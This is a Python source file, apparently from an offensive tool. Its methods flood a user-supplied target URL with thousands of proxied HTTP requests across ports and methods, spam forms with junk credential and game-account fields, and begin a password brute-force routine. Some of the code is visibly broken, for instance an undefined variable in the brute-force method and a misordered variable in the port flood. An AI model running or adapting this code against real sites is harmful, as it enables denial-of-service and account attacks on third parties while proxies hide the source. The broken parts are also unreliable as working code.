import random, chalk, os, math, urllib, socket
from concurrent.futures import ThreadPoolExecutor
from time import perf_counter
from .File import File
from src.utils.functions import xhr, checkValidUrl, get_proxies, random_str, random_id, random_ip, random_user_agent, url_port_join
from src.utils.io import log, question
from src.constants.paths import PATH_PROGRAM
from src.constants.ports import ports
from src.constants.config import config

class Thread:
    @staticmethod
    def smtp_killer ():
        url = question("input url target")
        urlJoined = url_port_join(url, 3306)
        
        if not checkValidUrl(url):
            Thread.smtp_killer()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["get"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, urlJoined, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def basic ():
        url = question("input url target")
        url = url_port_join(url, ports["ssl"])
        
        if not checkValidUrl(url):
            Thread.basic()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["get"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def all_requests ():
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.all_requests()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["head", "get", "post", "delete", "patch", "put"]
            urlJoined = url_port_join(url, ports[random.choice(list(ports))])
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, urlJoined, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                raise err
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def all_ports ():
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.all_requests()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["head", "get", "post"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                url = url_port_join(url, ports[random.choice(list(ports))])
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def spam_post ():
        url = question("input url target")
        total = 1000*10
        
        if not checkValidUrl(url):
            Thread.spam_post()
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        
        def func (iteration):
            methods = ["post", "get"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                data = {
                  "email": f"{ random_str(100) }@gmail.com",
                  "mail": f"{ random_str(100) }@gmail.com",
                  "pass": random_str(10),
                  "password": random_str(10),
                  "username": random_str(100),
                  "firstname": random_str(100),
                  "lastname": random_str(100),
                  "message": random_str(100),
                  "pesan": random_str(100),
                  "content": random_str(100),
                  "slug": random_str(100),
                  "name": random_str(100),
                  "_pass": random_str(10),
                  "playid": random_id(9),
                  "uid": random_id(9),
                  "player_id": random_id(9),
                  "nick": random_str(9),
                  "nickname": random_str(9),
                  "epass": "pernah",
                  "elite_pass": "pernah",
                  "pass": "pernah",
                  "tier": random.choice(["Bronze", "Master", "Silver", "Gold", "Platinum", "Grandmaster", "Diamond"]),
                  "login": "Facebook",
                  "submit": "true",
                  "ua": random_user_agent(),
                  "ip": random_ip(),
                }
                for method in methods:
                    output = xhr(method, url, proxies=proxy, params=data, data=data)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def bruteforce_website ():
        url = question("input url target")
        total = 1000*10
        
        passwords = set(File.read(f"{ PATH_PROGRAM }/src/includes/passwords.txt").split("\n"))
        users = set(File.read(f"{ PATH_PROGRAM }/src/includes/users.txt").split("\n"))
        
        if not checkValidUrl(url):
            Thread.bruteforce_website()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        
        def func (iteration):
            methods = ["post"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy, params=data, data=data)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")